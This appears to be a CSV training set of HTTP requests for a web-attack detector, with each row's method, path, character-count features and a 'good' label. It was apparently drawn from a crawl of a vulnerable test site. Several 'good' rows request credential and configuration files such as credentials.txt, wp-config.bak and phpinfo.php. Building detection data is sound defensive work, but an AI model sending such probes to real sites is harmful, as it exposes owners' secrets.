,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
0,GET,b'',b'/',0,0,0,0,0,0,good
1,GET,b'',b'/HmMjVS0m',0,0,0,0,0,0,good
2,GET,b'',b'/TI5tCZ1t',0,0,0,0,0,0,good
3,GET,b'',b'/VYZEUtrA',0,0,0,0,0,0,good
4,GET,b'',b'/',0,0,0,0,0,0,good
5,GET,b'',b'/robots.txt',0,0,0,0,0,0,good
6,POST,b'goButton=go&searchFor=1',b'/search.php?test=query',0,0,0,0,0,0,good
7,GET,b'',b'/hpp',0,0,0,0,0,0,good
8,GET,b'',b'/login.php',0,0,0,0,0,0,good
9,GET,b'',b'/search.php',0,0,0,0,0,0,good
10,GET,b'',b'/artists.php',0,0,0,0,0,0,good
11,GET,b'',b'/index.php',0,0,0,0,0,0,good
12,GET,b'',b'/cart.php',0,0,0,0,0,0,good
13,GET,b'',b'/guestbook.php',0,0,0,0,0,0,good
14,GET,b'',b'/categories.php',0,0,0,0,0,0,good
15,GET,b'',b'/AJAX/index.php',0,0,0,0,0,0,good
16,GET,b'',b'/disclaimer.php',0,0,0,0,0,0,good
17,GET,b'',b'/userinfo.php',0,0,0,0,0,0,good
18,GET,b'',b'/privacy.php',0,0,0,0,0,0,good
19,GET,b'',b'/Mod_Rewrite_Shop',0,0,0,0,0,0,good
20,GET,b'',b'/Flash/add.swf',0,0,0,0,0,0,good
21,GET,b'',b'/showimage.php',0,0,0,0,0,0,good
22,GET,b'',b'/signup.php',0,0,0,0,0,0,good
23,GET,b'',b'/product.php',0,0,0,0,0,0,good
24,GET,b'',b'/redir.php',0,0,0,0,0,0,good
25,GET,b'',b'/sendcommand.php',0,0,0,0,0,0,good
26,GET,b'',b'/index.bak',0,0,0,0,0,0,good
27,GET,b'',b'/listproducts.php',0,0,0,0,0,0,good
28,GET,b'',b'/logout.php',0,0,0,0,0,0,good
29,GET,b'',b'/database_connect.php',0,0,0,0,0,0,good
30,GET,b'',b'/crossdomain.xml',0,0,0,0,0,0,good
31,GET,b'',b'/comment.php',0,0,0,0,0,0,good
32,GET,b'',b'/clientaccesspolicy.xml',0,0,0,0,0,0,good
33,GET,b'',b'/clearguestbook.php',0,0,0,0,0,0,good
34,GET,b'',b'/404.php',0,0,0,0,0,0,good
35,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts/version.php',0,0,0,0,0,0,good
36,GET,b'',b'/vendor/installed.json',0,0,0,0,0,0,good
37,GET,b'',b'/secured/newuser.php',0,0,0,0,0,0,good
38,GET,b'',b'/secured/office.htm',0,0,0,0,0,0,good
39,GET,b'',b'/secured/index.php',0,0,0,0,0,0,good
40,GET,b'',b'/secured/phpinfo.php',0,0,0,0,0,0,good
41,GET,b'',b'/secured/database_connect.php',0,0,0,0,0,0,good
42,GET,b'',b'/pictures/path-disclosure-win.html',0,0,0,0,0,0,good
43,GET,b'',b'/pictures/wp-config.bak',0,0,0,0,0,0,good
44,GET,b'',b'/pictures/credentials.txt',0,0,0,0,0,0,good
45,GET,b'',b'/pictures/path-disclosure-unix.html',0,0,0,0,0,0,good
46,GET,b'',b'/pictures/ipaddresses.txt',0,0,0,0,0,0,good
47,GET,b'',b'/pictures/WS_FTP.LOG',0,0,0,0,0,0,good
48,GET,b'',b'/hpp/test.php',0,0,0,0,0,0,good
49,GET,b'',b'/hpp/index.php',0,0,0,0,0,0,good
50,GET,b'',b'/hpp/params.php',0,0,0,0,0,0,good
